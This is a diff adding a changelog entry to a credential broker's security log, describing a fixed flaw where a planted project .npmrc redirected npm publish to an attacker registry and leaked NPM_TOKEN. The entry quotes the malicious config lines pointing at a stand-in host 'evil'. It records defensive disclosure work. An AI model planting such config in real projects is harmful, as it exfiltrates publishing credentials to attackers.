@@ -189,6 +189,28 @@ against the running broker and re-verified fixed. Behaviour changes are flagged.
   loop now replies with a `-32700` parse error and keeps serving; only a genuine
   I/O error ends it. `src/mcp/server.rs`.
 
+### Fixed — cycle 6 (post-install re-attack: broker connector config redirection)
+
+- **N6 — `npm publish` did not pin the registry, so a caller-controlled
+  `cwd/.npmrc` could redirect the publish and exfiltrate the token.** `npm`
+  resolves config with the precedence `CLI flag > env > project .npmrc (cwd) >
+  user .npmrc`, and `publish` runs in the caller-controlled `cwd`. A planted
+  `cwd/.npmrc` with `registry=http://evil/` plus
+  `//evil/:_authToken=${NPM_TOKEN}` therefore redirected the publish to an
+  attacker registry AND caused npm to send the broker-injected `NPM_TOKEN`
+  (the real credential) there. Confirmed live: `npm config get registry` in
+  such a dir returns the attacker host, and a CLI `--registry` overrides it.
+  Fixed: `publish` and `deprecate` now pin `--registry` to
+  `https://registry.npmjs.org/` on the CLI (highest precedence), so the target
+  host is always npmjs.org and the token can only ever go there.
+  `src/primitives/npm.rs`. Regression: `cargo test --lib npm`.
+  **Behaviour note:** publishing to a non-npmjs.org registry via the broker is
+  no longer possible; an owner-configured trusted registry (via the allowlist,
+  not the caller's `cwd`) is tracked as a follow-up (`ISSUE-KVD-CLI-CF1724`).
+  Checked and NOT affected: `twine` reads `~/.pypirc` (not the cwd) and takes a
+  repository name; the `aws` CLI does not read cwd config — neither is
+  redirectable this way.
+
 ### Robustness confirmations (no fix needed)
 
 - `kvendra init` on an existing vault refuses (no clobber, no data loss, no
